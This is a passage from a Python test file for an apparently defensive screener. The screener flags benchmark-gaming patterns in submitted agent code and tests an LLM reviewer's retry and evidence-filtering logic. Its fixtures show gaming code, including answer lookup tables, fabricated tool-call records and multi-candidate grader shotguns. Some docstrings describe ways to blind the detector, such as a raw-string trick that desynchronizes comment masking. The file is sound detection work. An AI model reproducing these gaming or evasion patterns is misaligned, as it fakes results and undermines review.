    assert "expected-value-model-retry-loop" not in {lead["kind"] for lead in leads}


def test_planned_tool_call_self_report_routes_execution_provenance_review() -> None:
    source = """\
fn respond(plan: Plan) -> Response {
    let selected_tool = plan.predicted_tool();
    let reported_tool_call = ObservedToolCall::from(selected_tool);
    let trajectory = vec![reported_tool_call];
    return Response::with_observed_calls(trajectory);
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "planned-tool-call-self-report" in {lead["kind"] for lead in leads}


def test_finite_family_world_compiler_routes_manual_review() -> None:
    source = """\
fn solve(req: Request) -> Value {
    let world_schema = WORLD_DEFINITION_REGISTRY.lookup(req.family);
    let family = classify_template(req.question, world_schema);
    let check_value = derive_answer(family, req.memories);
    check_value
}
"""

    leads = find_source_review_leads([("src/compiler.rs", source)])

    assert "finite-family-world-compiler" in {lead["kind"] for lead in leads}


def test_c13_fingerprints_are_location_only_leads() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let family = family_of(&req.question);
    let program = try_solve(family, req.memories);
    let records = retrieve(req.user_id);
    let prompt = format!("Do not recompute. Copy its value exactly: {}", program);
    Response::from_model(call_model(records, prompt))
}
"""

    leads = find_source_review_leads([("src/compiler.rs", source)])
    kinds = {lead["kind"] for lead in leads}

    assert "c13-bench-family-fingerprint" in kinds
    encoded = json.dumps(leads)
    assert "try_solve" not in encoded
    assert "Do not recompute" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_c13_fingerprints_spare_starter_protocol_and_generic_retries() -> None:
    source = """\
pub async fn run(req: Request) -> RunResponse {
    for attempt in 0..2 {
        let draft = call_model(req.question, retrieve(req.user_id));
        if catalog.validate(&draft) {
            return draft.into_response();
        }
    }
    RunResponse::from_model(call_model(req.question, retrieve(req.user_id)))
}

#[cfg(test)]
fn protocol_helper() -> RunResponse {
    RunResponse { prompt_tokens: 0, output_tokens: 0, answer: None }
}

const PROTOCOL_JSON: &str = r#"{"prompt_tokens":0}"#;
"""

    leads = find_source_review_leads([("src/main.rs", source)])

    assert "c13-bench-family-fingerprint" not in {lead["kind"] for lead in leads}


def test_glossary_block_prompt_grounding_is_c13_lead_not_compiler() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let records = retrieve(req.user_id);
    let glossary_block = role_grounding(records);
    Response::from_model(call_model(req.question, records, glossary_block))
}
"""

    leads = find_source_review_leads([("src/baseline.rs", source)])
    kinds = {lead["kind"] for lead in leads}

    assert "c13-bench-family-fingerprint" in kinds
    assert "finite-family-world-compiler" not in kinds


def test_derive_as_prompt_is_not_a_c13_fingerprint_or_compiler_lead() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let records = retrieve(req.user_id);
    let expected = derive_expected(records);
    let draft = call_model(req.question, records, specialized_prompt(expected));
    Response::from_model(draft)
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])
    kinds = {lead["kind"] for lead in leads}

    assert "c13-bench-family-fingerprint" not in kinds
    assert "finite-family-world-compiler" not in kinds


def test_c13_tokens_include_remainder_formatter_and_shape_leads() -> None:
    source = """\
fn answer(req: Request) -> Response {
    let remaining = StoryArc::from(req).balance();
    let _ = (required_money, world_shape_rule, LedgerEventKind::Opening);
    let draft = call_model(req.question, retrieve(req.user_id));
    if reply_restates_story_ingredient_money(&draft, remaining) {
        return draft.into_response();
    }
    draft.into_response()
}
"""

    leads = find_source_review_leads([("src/compiler.rs", source)])
    kinds = {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)

    assert "c13-bench-family-fingerprint" in kinds
    assert "StoryArc" not in encoded
    assert "required_money" not in encoded
    assert "world_shape_rule" not in encoded
    assert "LedgerEventKind" not in encoded
    assert "reply_restates_story_ingredient_money" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_runtime_described_world_interpreter_spares_compiler_lead() -> None:
    source = """\
fn solve(req: Request, live_schema: Schema) -> Value {
    let world_schema = live_schema.runtime_described(req.ontology);
    let family = classify_template(req.question, world_schema);
    let check_value = derive_answer(family, req.memories);
    call_model_with_tool_schema(req, live_schema, check_value)
}
"""

    leads = find_source_review_leads([("src/interpreter.rs", source)])

    assert "finite-family-world-compiler" not in {lead["kind"] for lead in leads}


def test_authority_envelope_answer_shotgun_fires_on_emit_both() -> None:
    source = """\
fn answer(req: Request) -> String {
    if detect_sync_precedence_note(&req.notes) {
        let candidates = push_all_candidates(req.attribute);
        return emit_both(candidates.stated, candidates.report_as_value);
    }
    decline_only()
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert "authority-envelope-answer-shotgun" in {lead["kind"] for lead in leads}
    assert "detect_sync_precedence_note" not in json.dumps(leads)


def test_authority_shotgun_suppressed_by_intervening_model_call() -> None:
    # All three roles are present, but the candidates are handed to a real model
    # as context, so this is allowed multi-value context, not a grader seam.
    source = """\
fn answer(req: Request) -> String {
    if detect_sync_precedence_note(&req.notes) {
        let candidates = push_all_candidates(req.attribute);
        // note says report_as corrected; hand both to the model as context
        let reply = call_model(req.question, candidates);
        return emit_both_to_model(reply);
    }
    decline_only()
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert "authority-envelope-answer-shotgun" not in {lead["kind"] for lead in leads}


def test_coined_token_shape_mirror_fires_on_alphabet_answer_selection() -> None:
    source = """\
const CONS: &str = "BCDFGHJKLMNPRSTVZ";
const VOW: &str = "AEIOU";
fn coined_answer(mem: &Memory) -> String {
    let token = scan_coined_shape(mem, "VK-");
    return pick_answer_token(token);
}
"""

    leads = find_source_review_leads([("src/coin.rs", source)])

    assert "coined-token-shape-mirror" in {lead["kind"] for lead in leads}
    assert "BCDFGHJKLMNPRSTVZ" not in json.dumps(leads)


def test_coined_token_shape_mirror_spares_injection_defense() -> None:
    # Same alphabet + shape + selection, but the token flows to a redact sink
    # over the request user's own message: an injection defense, not a solver.
    source = """\
const CONS: &str = "BCDFGHJKLMNPRSTVZ";
fn defend(user_input: &str) -> String {
    let token = scan_coined_shape(user_input, "VK-");
    let picked = pick_answer_token(token);
    return redact(picked);
}
"""

    leads = find_source_review_leads([("src/defend.rs", source)])

    assert "coined-token-shape-mirror" not in {lead["kind"] for lead in leads}


def test_numeric_candidate_shotgun_is_advisory_and_suppressible() -> None:
    fires = """\
fn compute(mem: &Memory) -> String {
    // apply all unit conversions and emit the range of candidates
    let results = apply_all_conversions(mem);
    return emit_range(results);
}
"""
    spared = """\
fn compute(mem: &Memory) -> String {
    let results = apply_all_conversions(mem);
    // resolve to one final value / single value
    return single_value_of(results);
}
"""

    fired = {lead["kind"] for lead in find_source_review_leads([("src/n.rs", fires)])}
    clear = {lead["kind"] for lead in find_source_review_leads([("src/n.rs", spared)])}

    assert "numeric-candidate-shotgun" in fired
    assert "numeric-candidate-shotgun" not in clear


def test_leads_do_not_fire_on_comment_prose_alone() -> None:
    """A stale comment describing a design must not route a review.

    This is the isop v3 shape: the code refuses to write the graded slot and
    says so, while three leftover comments still describe the design it no
    longer has. Every role word here lives in prose; the executable statement
    is an ordinary model call.
    """
    source = """\
fn answer(req: Request) -> String {
    // Historical note: we used to detect the sync precedence note and
    // push all candidates, then emit both values and report as corrected.
    // That design is gone; the model authors the answer now.
    call_model(req.question)
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert leads == []


def test_leads_read_through_a_url_containing_a_double_slash() -> None:
    """`//` inside a string literal does not start a comment.

    The only ``multi-value-emit`` hit sits *after* the URL on the same line,
    so a mask that treated `https://` as a line comment would lose the role
    and silently drop the lead.
    """
    source = """\
fn answer(req: Request) -> String {
    if detect_sync_precedence_note(&req.notes) {
        let base = "https://api.example/v1"; let c = push_all_candidates(req.a);
        return emit_pair(c.stated, c.report_as_value);
    }
    decline_only()
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert "authority-envelope-answer-shotgun" in {lead["kind"] for lead in leads}


def test_a_raw_string_cannot_desynchronize_the_comment_mask() -> None:
    """`r#"*/"#` must not terminate a block comment that was never open.

    Without raw-string handling the mask desynchronizes and blanks the rest
    of the file, which would silently blind every later rule — a one-line,
    fully deniable way to hide the executable half of a violation.
    """
    source = """\
const TRAP: &str = r#"*/"#;
fn answer(req: Request) -> String {
    if detect_sync_precedence_note(&req.notes) {
        let candidates = push_all_candidates(req.attribute);
        return emit_both(candidates.stated, candidates.report_as_value);
    }
    decline_only()
}
"""

    leads = find_source_review_leads([("src/answer.rs", source)])

    assert "authority-envelope-answer-shotgun" in {lead["kind"] for lead in leads}


def test_positional_number_extraction_is_advisory_and_suppressible() -> None:
    fires = """\
fn extract(result: &str) -> String {
    let number = find_numbers(result).first();
    number.to_string()
}
"""
    spared = """\
fn extract(result: &str, subject: &str) -> String {
    // anchored by the asked subject needle
    let number = find_numbers(result).first();
    number_for_subject(number, subject)
}
"""

    fired = {lead["kind"] for lead in find_source_review_leads([("src/p.rs", fires)])}
    clear = {lead["kind"] for lead in find_source_review_leads([("src/p.rs", spared)])}

    assert "positional-number-extraction" in fired
    assert "positional-number-extraction" not in clear


def test_answer_shaped_token_density_flags_saturated_vocab() -> None:
    codes = [str(2000 + index) for index in range(300)]
    coined = ["GAVOTU-8842", "VK-ABCDEFGH23", "84-GAVO-TUKE"] * 20
    blob = json.dumps({"vocab": dict.fromkeys(codes + coined, 1)}).encode()

    analysis = binary_analysis_module.analyze_binary(
        _sample(blob), path="fixtures/models/second_gate.json"
    )
    stat = analysis["answer_shaped_tokens"]

    assert stat["answer_shaped_ratio_bucket"] == "high"
    assert stat["bare_code_tokens"] >= 250
    assert stat["coined_needle_tokens"] >= 1
    # Values never leave the analyzer, only counts and a coarse bucket.
    assert "2235" not in json.dumps(stat)


def test_answer_shaped_token_density_spares_word_vocabulary() -> None:
    words = [
        "memory",
        "retrieve",
        "question",
        "employer",
        "university",
        "instrument",
        "project",
        "cuisine",
    ] * 40
    blob = json.dumps({"vocab": dict.fromkeys(set(words), 1)}).encode()

    analysis = binary_analysis_module.analyze_binary(
        _sample(blob), path="fixtures/models/tfidf.json"
    )

    assert analysis["answer_shaped_tokens"]["answer_shaped_ratio_bucket"] == "none"


def test_inventory_surfaces_answer_shaped_token_density(tmp_path: Path) -> None:
    codes = [str(2000 + index) for index in range(300)]
    blob = b"\xff\x00" + json.dumps({"vocab": dict.fromkeys(codes, 1)}).encode()
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"fixtures/models/gate.json": blob}))
    )

    inventory = json.loads(repo.inventory())
    entry = inventory["binary_analysis"][0]

    assert entry["answer_shaped_tokens"]["answer_shaped_ratio_bucket"] == "high"


def test_every_static_review_failure_message_maps_to_a_named_code() -> None:
    """No source-review failure may silently collapse to a bare exception name.

    Collapsing every ``ValueError`` into ``source-review-valueerror`` is what
    made the miner-visible "Screening infrastructure error" undiagnosable and
    frequently untrue. If a new ``raise ValueError("...")`` is added to the
    review path, this test forces the author to classify it.
    """
    import ast
    import inspect

    source = inspect.getsource(source_review_module)
    unmapped = set()
    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Raise) or node.exc is None:
            continue
        call = node.exc
        if not isinstance(call, ast.Call) or not isinstance(call.func, ast.Name):
            continue
        if call.func.id != "ValueError" or not call.args:
            continue
        literal = call.args[0]
        # f-strings interpolate a runtime value and are matched by prefix.
        if not isinstance(literal, ast.Constant) or not isinstance(literal.value, str):
            continue
        if literal.value not in source_review_module._SOURCE_REVIEW_FAILURE_CODES:
            unmapped.add(literal.value)

    assert not unmapped, (
        "add these to _SOURCE_REVIEW_FAILURE_CODES so the failure keeps a cause: "
        f"{sorted(unmapped)}"
    )


def test_source_review_budget_exhaustion_has_public_safe_exact_accounting() -> None:
    error = source_review_module.SourceReviewBudgetExhausted(
        "source-review-step-budget-exhausted",
        max_steps=20,
        steps_used=20,
        read_bytes_used=456_789,
        read_files_used=17,
    )
    audit = error.audit()
    assert audit.stage == "l1"
    assert audit.reason_code == "source-review-step-budget-exhausted"
    assert audit.steps_used == audit.max_steps == 20
    assert audit.read_bytes_used == 456_789
    assert "source" not in audit.model_dump(mode="json")


@pytest.mark.parametrize(
    ("error", "expected"),
    [
        (
            ValueError("source archive contains a duplicate path"),
            "source-review-archive-invalid",
        ),
        (
            ValueError("source reviewer exceeded read budget"),
            "source-review-read-budget-exhausted",
        ),
        (
            ValueError("source reviewer exceeded step budget"),
            "source-review-step-budget-exhausted",
        ),
        (
            ValueError("source reviewer returned no tool call"),
            "source-review-model-response-invalid",
        ),
        (
            ValueError("source reviewer cited an unknown archive member"),
            "source-review-model-cited-unknown-member",
        ),
        (
            ValueError("provenance manifest is too large"),
            "source-review-provenance-invalid",
        ),
        (
            ValueError(
                "source review category benchmark_emulation requires two "
                "source locations"
            ),
            "source-review-inconsistent-verdict",
        ),
        # Anything unrecognized must degrade to the historical shape rather
        # than lose the failure.
        (ValueError("brand new unmapped failure"), "source-review-valueerror"),
        (OSError("source review API key is unavailable"), "source-review-oserror"),
    ],
)
def test_failure_codes_name_the_cause(error: Exception, expected: str) -> None:
    assert source_review_module._source_review_failure_code(error) == expected


@pytest.mark.parametrize(
    "message",
    [
        "source reviewer exceeded read budget",
        "source reviewer exceeded step budget",
    ],
)
async def test_local_review_budget_exhaustion_is_inconclusive(
    tmp_path: Path, message: str
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review-key")
    key.chmod(0o600)
    agent = _agent(key, _transport({}, []))

    async def exhaust(*_args: object, **_kwargs: object) -> tuple[object, bool]:
        raise ValueError(message)

    agent._run = exhaust  # type: ignore[method-assign]
    observation = await agent.review(
        str(_archive(tmp_path, "fn main() {}")), artifact_sha256=_SHA
    )

    assert observation.ok is False
    assert observation.failure_disposition == "inconclusive"


# --- inadmissible-citation filter -------------------------------------------


async def test_wholly_inadmissible_evidence_demotes_instead_of_quarantining(
    tmp_path: Path,
) -> None:
    """The infinity v10 shape: every citation is stock prose or an attribute.

    `protocol.rs:174` in the official starter kit is
    `#[serde(default, skip_serializing_if = "Option::is_none")]` — a stock
    attribute on a stock field the kit explicitly invites miners to populate.
    A finding built only from lines like that has demonstrated no behaviour.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        "/// Optional short answer slot: the bare value final_text asserts.\n"
        '#[serde(default, skip_serializing_if = "Option::is_none")]\n'
        "fn main() { call_model(); }\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
        ],
        "summary": "Answer slot is populated outside the model result.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok
    # Demoted, not failed: a ValueError here would surface as retryable_infra
    # and burn the attempt instead of releasing the submission.
    assert observation.risk_level == "low"
    assert observation.categories == ("none",)
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert parsed.evidence == []


async def test_admissible_citations_keep_the_finding(tmp_path: Path) -> None:
    """Dropping prose must not disarm a finding that also cites real code."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        "// stale note describing a design that is gone\n"
        "fn answer(req: Request) -> String {\n"
        "    let v = lookup_table(&req.case_id);\n"
        '    return format!("The answer is {v}.");\n'
        "}\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 3, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 4, "category": "benchmark_emulation"},
        ],
        "summary": "Deterministic table answer returned before the model.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation",)
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert [item.line for item in parsed.evidence] == [3, 4]


async def test_cfg_test_helper_is_not_citable(tmp_path: Path) -> None:
    """`async fn serve(...)` inside `#[cfg(test)] mod preflight_tests` is stock.

    It ships in the official starter kit and never runs in the served image,
    yet it was cited as HTTP-setup evidence.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        "fn main() { call_model(); }\n"
        "\n"
        "#[cfg(all(test))]\n"
        "mod preflight_tests {\n"
        "    async fn serve(app: Router) -> String { bind_listener() }\n"
        "    fn capture_call() -> String { record() }\n"
        "}\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 5, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 6, "category": "benchmark_emulation"},
        ],
        "summary": "Test-only harness cited as served behaviour.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "low"


async def test_reachability_gate_attribute_stays_citable(tmp_path: Path) -> None:
    """`#[cfg(feature = ...)]` is a gate a submission can flip between versions.

    Attribute lines are normally inert, but a reachability gate can genuinely
    be the trigger half of a causal path, so it must remain admissible.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        '#[cfg(feature = "grounding")]\n'
        "fn shortcut(case: &str) -> String { answer_table(case) }\n"
        "fn main() { call_model(); }\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
        ],
        "summary": "Feature-gated answer table.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "high"
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert [item.line for item in parsed.evidence] == [1, 2]


async def test_a_dropped_comment_does_not_reapply_the_two_location_bar(
    tmp_path: Path,
) -> None:
    """The `banblackycat v12` margin, pinned.

    That rejection cites six locations and loses three to comments. The
    two-location bar for `benchmark_emulation` is a check on the *model* and is
    enforced above against the citations as given; re-applying it after our own
    filtering would turn a correct rejection into a release the moment one
    cited line happened to be prose.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = (
        "// a note about the loop outcome\n"
        "fn run(case: &str) -> LoopOutcome {\n"
        "    let text = table(case);\n"
        "    LoopOutcome { text, prompt_tokens: 0, output_tokens: 0 }\n"
        "}\n"
    )
    final = {
        "risk_level": "high",
        "confidence": 0.99,
        "categories": ["benchmark_emulation"],
        "evidence": [
            # Two cited locations satisfy the model-consistency bar; one of
            # them is a comment and drops.
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 4, "category": "benchmark_emulation"},
        ],
        "summary": "Graded answer returned with no model call.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok
    assert observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation",)
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert [item.line for item in parsed.evidence] == [4]


async def test_provider_error_body_is_retried_within_one_turn(
    tmp_path: Path,
) -> None:
    """A 200 whose body is an error object is a provider fault, not a verdict."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "low",
        "confidence": 0.9,
        "categories": ["none"],
        "evidence": [],
        "summary": "General model-backed request path.",
    }
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls == 1:
            return httpx.Response(
                200, json={"error": {"message": "provider overloaded"}}
            )
        if calls == 2:
            tool_calls = [
                _tool(
                    "read-1",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 400},
                ),
                _tool("search-1", "search", {"query": "call_model"}),
            ]
        else:
            tool_calls = [_tool("submit-1", "submit_review", final)]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert calls >= 3


async def test_toolless_prose_turn_is_nudged_back_to_tools(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    final = {
        "risk_level": "low",
        "confidence": 0.9,
        "categories": ["none"],
        "evidence": [],
        "summary": "General model-backed request path.",
    }
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        seen.append(json.loads(request.content))
        calls += 1
        if calls == 1:
            return httpx.Response(
                200,
                json={
                    "choices": [
                        {
                            "message": {
                                "role": "assistant",
                                "content": "Let me start by reading the code.",
                            }
                        }
                    ]
                },
            )
        if calls == 2:
            tool_calls = [
                _tool(
                    "read-1",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 400},
                ),
                _tool("search-1", "search", {"query": "call_model"}),
            ]
        else:
            tool_calls = [_tool("submit-1", "submit_review", final)]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    nudged = [
        message
        for request in seen
        for message in request["messages"]
        if message.get("role") == "user"
        and "Respond only with a tool call" in str(message.get("content"))
    ]
    assert nudged


async def test_persistent_toolless_model_still_fails_retryable(
    tmp_path: Path,
) -> None:
    """The nudge budget is bounded; a stuck model stays a hard, retryable fail."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    def handler(_request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": "I would rather describe my findings.",
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-model-response-invalid"
    assert observation.failure_disposition == "retryable_infra"


async def test_relayed_rate_limit_error_body_is_retried(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A 200 body carrying ``{"error": {"code": 429}}`` retries, then reviews.

    OpenRouter relays provider rate limits inside successful HTTP responses.
    The sub-second malformed-body ladder was too short to outlive a real rate
    limit, so the review burned as retryable_infra and the attempt rescreened.
    """
    monkeypatch.setattr(
        source_review_module, "_MODEL_ERROR_RETRY_DELAYS_SECONDS", (0.0, 0.0, 0.0)
    )
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "low",
        "confidence": 0.99,
        "categories": ["none"],
        "evidence": [],
        "summary": "Inventory-only result.",
    }
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls <= 2:
            return httpx.Response(
                200,
                json={
                    "error": {"code": 429, "message": "Rate limit exceeded"},
                    "user_id": "redacted",
                },
            )
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [_tool("submit-1", "submit_review", final)],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert calls == 3


async def test_string_error_body_and_free_text_rate_limit_are_classified() -> None:
    assert (
        source_review_module._retryable_model_error_type(
            {"error": "rate_limit_exceeded"}
        )
        == "rate_limit_exceeded"
    )
    assert (
        source_review_module._retryable_model_error_type(
            {"error": {"code": 400, "message": "Rate limit exceeded: free-models"}}
        )
        == "rate_limit_exceeded"
    )
    assert (
        source_review_module._retryable_model_error_type(
            {"error": "Provider is overloaded, please try again"}
        )
        == "overloaded"
    )
    assert (
        source_review_module._retryable_model_error_type({"error": "invalid api key"})
        is None
    )
    assert source_review_module._retryable_model_error_type({"choices": []}) is None


async def test_unclassified_malformed_body_gets_exactly_one_long_retry(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A garbage 200 body means no verdict was authored: wait once, not thrice.

    The sub-second malformed ladder could not outlive a real provider fault,
    but an unclassified shape may be a BILLED completion under contract
    drift, so it gets exactly one transport-ladder retry — classified
    (unbilled) provider faults keep the full ladder.
    """
    monkeypatch.setattr(
        source_review_module, "_MODEL_ERROR_RETRY_DELAYS_SECONDS", (0.0, 0.0, 0.0)
    )
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "low",
        "confidence": 0.99,
        "categories": ["none"],
        "evidence": [],
        "summary": "Inventory-only result.",
    }
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls == 1:
            return httpx.Response(200, json={"unexpected": "shape"})
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [_tool("submit-1", "submit_review", final)],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert calls == 2


async def test_persistent_unclassified_body_fails_after_two_posts(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Contract drift must not become a paid retry loop: 2 posts, then fail."""
    monkeypatch.setattr(
        source_review_module, "_MODEL_ERROR_RETRY_DELAYS_SECONDS", (0.0, 0.0, 0.0)
    )
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(200, json={"unexpected": "shape"})

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.failure_disposition == "retryable_infra"
    assert calls == 2


def test_body_signature_never_reproduces_content() -> None:
    signature = source_review_module._body_signature(
        {"choices": [], "secret_content": "miner source text here"}
    )
    assert "miner source text" not in signature
    assert "choices" in signature
    assert source_review_module._body_signature(None) == "non-json"


async def test_non_json_body_rides_the_full_unbilled_ladder(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A non-JSON 200 body cannot be a billed completion: retry it fully.

    CDN error pages and truncated streams arrive as unparseable 200s during
    provider throttling; one retry burned reviews the ladder could save.
    """
    monkeypatch.setattr(
        source_review_module,
        "_MODEL_ERROR_RETRY_DELAYS_SECONDS",
        (0.0, 0.0, 0.0),
    )
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "low",
        "confidence": 0.99,
        "categories": ["none"],
        "evidence": [],
        "summary": "Inventory-only result.",
    }
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls <= 3:
            return httpx.Response(
                200,
                text="<html>upstream error</html>",
                headers={"content-type": "text/html"},
            )
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [_tool("submit-1", "submit_review", final)],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert calls == 4


async def test_http_429_rides_the_long_ladder(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Real HTTP 429s wait like relayed ones instead of dying inside 1.5s."""
    monkeypatch.setattr(
        source_review_module,
        "_MODEL_ERROR_RETRY_DELAYS_SECONDS",
        (0.0, 0.0),
    )
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "low",
        "confidence": 0.99,
        "categories": ["none"],
        "evidence": [],
        "summary": "Inventory-only result.",
    }
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls <= 2:
            return httpx.Response(429, json={"error": "rate limited"})
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [_tool("submit-1", "submit_review", final)],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert calls == 3


def _note_call(
    call_id: str, kind: str, summary: str, **extra: object
) -> dict[str, object]:
    return _tool(call_id, "record_note", {"kind": kind, "summary": summary, **extra})


def test_review_transcript_compaction_keeps_stable_prefix_and_recent_turns() -> None:
    messages: list[dict[str, object]] = [
        {"role": "system", "content": "stable-system"},
        {"role": "user", "content": "stable-inventory"},
